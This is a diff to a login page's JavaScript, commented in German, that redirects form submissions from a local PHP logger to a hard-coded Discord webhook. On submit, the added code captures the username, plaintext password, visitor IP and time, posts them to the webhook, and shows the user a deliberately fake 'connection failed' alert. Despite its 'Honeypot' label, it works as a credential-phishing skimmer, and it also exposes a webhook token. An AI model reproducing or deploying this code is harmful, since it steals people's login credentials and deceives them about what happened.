@@ -106,66 +106,100 @@
     </footer>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            
-            const loader = document.getElementById('loader-wrapper');
-            const ipInfoElement = document.getElementById('ip-info');
-            const loginForm = document.getElementById('login-form');
-            
-            let currentIp = 'Unbekannt'; // Variable zum Speichern der IP
+    document.addEventListener('DOMContentLoaded', function() {
+        
+        const loader = document.getElementById('loader-wrapper');
+        const ipInfoElement = document.getElementById('ip-info');
+        const loginForm = document.getElementById('login-form');
+        
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1445876618458300558/b2T4ZyYWCNCXIEZApJltktwbAmmgE1asljZ5LJqUH1nApZ0Y3z_2e7nDxkZqHqK9JPA1";
 
-            // 1. IP abrufen (wie in deinem Originalcode)
-            fetch('https://api.ipify.org?format=json')
-                .then(response => {
-                    if (!response.ok) throw new Error('Network response was not ok');
-                    return response.json();
-                })
-                .then(data => {
-                    currentIp = data.ip;
-                    ipInfoElement.textContent = 'Your IP: ' + data.ip;
-                })
-                .catch(error => {
-                    console.error('Error fetching IP:', error);
-                    ipInfoElement.textContent = 'Could not verify connection.';
-                })
-                .finally(() => {
-                    loader.style.display = 'none';
-                });
+        let currentIp = 'Unbekannt';
 
-            // 2. Formular absenden abfangen
-            loginForm.addEventListener('submit', function(event) {
-                event.preventDefault(); // Verhindert das normale Neuladen der Seite
+        // 1. IP abrufen
+        fetch('https://api.ipify.org?format=json')
+            .then(response => {
+                if (!response.ok) throw new Error('Netzwerkfehler');
+                return response.json();
+            })
+            .then(data => {
+                currentIp = data.ip;
+                ipInfoElement.textContent = 'Your IP: ' + data.ip;
+            })
+            .catch(error => {
+                console.error('IP Fehler:', error);
+                ipInfoElement.textContent = 'Connection verify failed.';
+            })
+            .finally(() => {
+                loader.style.display = 'none';
+            });
 
-                // Daten aus den Feldern holen
-                const username = document.getElementById('username').value;
-                const password = document.getElementById('password').value;
+        // 2. Login abfangen und an Discord senden
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault(); // Kein Neuladen der Seite
 
-                // Das Datenpaket schnüren (Dictionary/JSON Objekt)
-                const loginData = {
-                    ip: currentIp,
-                    username: username,
-                    password: password
-                };
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
 
-                // Daten an dein PHP-Skript senden
-                fetch('save_login.php', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(loginData)
-                })
-                .then(response => response.json())
-                .then(result => {
-                    console.log('Erfolg:', result);
-                    alert("Login Versuch protokolliert! (Dies ist nur eine Demo)");
-                    // Hier könntest du weiterleiten: window.location.href = "dashboard.html";
-                })
-                .catch(error => {
-                    console.error('Fehler:', error);
-                });
+            // Wir bauen die Nachricht für Discord
+            // "embeds" sorgt für eine hübsche Formatierung im Chat
+            const payload = {
+                username: "Security Bot", // Name des Bots im Chat
+                avatar_url: "https://i.imgur.com/4M34hi2.png", // Optional: Ein Icon
+                embeds: [
+                    {
+                        title: "🚨 Neuer Login-Versuch!",
+                        color: 16711680, // Rot (Hex Code in Dezimal)
+                        fields: [
+                            {
+                                name: "IP Adresse",
+                                value: currentIp,
+                                inline: true
+                            },
+                            {
+                                name: "Username",
+                                value: username,
+                                inline: true
+                            },
+                            {
+                                name: "Password",
+                                value: password, // Hier sehen wir das Passwort
+                                inline: false
+                            },
+                            {
+                                name: "Zeitpunkt",
+                                value: new Date().toLocaleString('de-DE'),
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "Honeypot Log System"
+                        }
+                    }
+                ]
+            };
+
+            // Senden an Discord
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Verbindung fehlgeschlagen. (Fake Meldung für den User)");
+                    console.log("Log an Discord gesendet!");
+                } else {
+                    console.error("Fehler beim Senden an Discord");
+                }
+            })
+            .catch(error => {
+                console.error('Fehler:', error);
             });
         });
+    });
     </script>
 </body>
 </html>
